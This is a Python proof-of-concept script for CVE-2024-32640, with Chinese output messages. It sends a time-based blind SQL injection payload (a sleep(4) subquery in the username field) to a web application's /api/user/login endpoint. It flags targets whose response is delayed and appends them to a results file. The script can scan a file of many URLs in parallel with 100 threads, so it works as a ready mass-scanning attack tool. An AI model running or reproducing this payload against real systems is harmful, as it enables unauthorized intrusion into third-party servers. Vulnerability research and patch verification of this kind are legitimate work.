import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

headers = {
    "Sec-Ch-Ua": "\"Chromium\";v=\"109\", \"Not_A Brand\";v=\"99\"", 
    "Accept": "application/json, text/javascript, */*; q=0.01", 
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
    "Accept-Encoding": "gzip, deflate", 
    "Accept-Language": "zh-CN,zh;q=0.9"
    }

def poc(target):
    url_payload = '/api/user/login'
    url = target+url_payload
    data = {
    "captcha": '', 
    "password": "21232f297a57a5a743894a0e4a801fc3", 
    "username": "admin'and(select*from(select sleep(4))a)='"}
    res1 = requests.get(target,verify=False)
    if res1.status_code == 200:
        res2 = requests.post(url=url,headers=headers,data=data,verify=False)
        time1 = res2.elapsed.total_seconds()
        if time1  >= 4:
            print(f'[+]{target}存在延时注入')
            with open('result.txt','a') as f:
                f.write(target+'\n')
        else:
            print(f'[-]{target}不存在延时注入')
    else:
        print(f'[-]{target}可能存在问题，请手工测试')
        
def main():
    parser = argparse.ArgumentParser(description="CVE-2024-32640_poc")
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()